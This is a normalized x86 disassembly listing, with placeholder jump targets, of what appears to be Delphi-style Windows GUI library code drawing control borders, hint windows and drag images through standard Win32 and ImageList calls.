mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f994
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_449b44
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44fdac
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44a9c8
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44845c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_44fdf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44abe8
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44fe24
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor ecx ecx
push ebp
push sub_44ff53
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c00c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff5a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44bfd0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44ff5a
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40348c
jmp r-xdata
sub_44fff0
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_449ca8
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_449ca8
sub_450034
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_449ca8
sub_4500a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_450134
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45039a
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43936c
call sub_43944c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43936c
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_439a64
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4503dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_448638
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44cbc8
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_449ca8
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44ae6c
sub_450448
push ebx
push esi
mov esi edx
call sub_45f870
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406ae8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_449ca8
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406ae8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_449ca8
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4504ac
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44cf90
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4504e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4504dc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450524
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_447bf4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_450580
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_447ccc
test bl bl
jle r-xdata
xor eax eax
call sub_445cc4
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4505c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424450
xor eax eax
push ebp
push sub_45065b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424934
xor eax eax
push ebp
push sub_450638
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45063f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424934
retn
sub_45066c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450f60
mov edx r--data
mov eax esi
call sub_448c94
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_4247d4
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4240d0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4506d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c168
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bfc0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c100
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_450744
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45079a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507a1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
sub_4507a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_450841
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4237e8
mov eax ebx
call sub_44ae14
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x14 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x208 ]
call sub_4248b4
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450848
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_450850
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_4508bc
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_450947
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45094e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448af4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_424714
mov edx eax
add edx 0x6
mov eax esi
call sub_4482b0
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448af4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_424730
mov edx eax
add edx 0x4
mov eax esi
call sub_4482d4
sub_450954
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_450b2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448b24
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_449d4c
mov eax [ esi ]
call sub_4660a8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4660b4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4660a8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46609c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_4660b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_466090
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46609c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_466090
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44ca10
push 0x4
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b34
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042c8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_453ba8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call [ rw-data ]
sub_450b3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_450b64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416cd4
mov eax esi
call sub_44ae14
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ esi + 0x208 ]
call sub_4248b4
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_450bc0
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416cd4
call sub_43936c
call sub_43944c
test al al
jne r-xdata
call sub_43936c
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_4396d8
push esp
push 0x1
push 0xf
push 0x0
call sub_43936c
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4394bc
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_450c2c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44d318
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_450c50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_450c90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450d50
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429674
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429674
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_450d5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_455d2c
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_450dbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_455bf0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_450c90
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_450e1c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_450d5c
push 0x0
call ShowCursor
sub_450e1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_455bf0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_450e80
mov ebx esi
